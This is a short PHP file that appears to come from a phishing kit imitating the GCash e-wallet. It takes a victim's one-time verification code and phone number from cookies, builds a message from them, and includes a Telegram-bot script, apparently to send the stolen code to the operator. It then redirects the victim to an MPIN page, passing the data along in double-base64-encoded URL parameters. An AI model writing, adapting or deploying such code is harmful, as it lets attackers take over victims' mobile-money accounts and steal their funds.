<?php
include('system.php');
$otp_auto = $_COOKIE["gcashotp"];
$numotp = $otp_auto;
$encodenumotp = base64_encode(base64_encode($numotp));
$gcash_number = base64_encode(base64_encode($_COOKIE["number"]));
$from = base64_decode(base64_decode($gcash_number));
$replyMsg = "\n =Verification Code= => $numotp\n\n
\n From=> $from";
include('Gcash_files/tele_bot.php');
header("Location:mpin.php?mpinclid=$encodenumotp&mobnumid=$gcash_number");


?>